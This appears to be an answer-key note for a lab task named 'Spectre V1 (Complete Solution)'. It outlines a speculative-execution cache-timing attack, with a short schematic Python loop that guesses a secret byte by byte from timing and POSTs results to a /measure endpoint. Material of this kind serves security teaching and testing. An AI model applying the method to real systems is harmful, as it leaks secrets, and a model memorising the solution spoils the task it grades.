# Task 002: Spectre V1 (Complete Solution)

**Vulnerability**: Speculative execution side-channel

**Attack**: Use timing differences to detect CPU cache hits
- Send out-of-bounds index to trigger speculation
- Measure timing to infer which array element was speculatively loaded
- Reconstruct secret from timing patterns

**Algorithm**:
```python
for byte_pos in range(8):
    for guess in range(256):
        timing = measure(index=byte_pos, probe=guess)
        if timing > threshold:
            secret[byte_pos] = guess
            break
```

**Implementation**: POST to `/measure` with timing results.
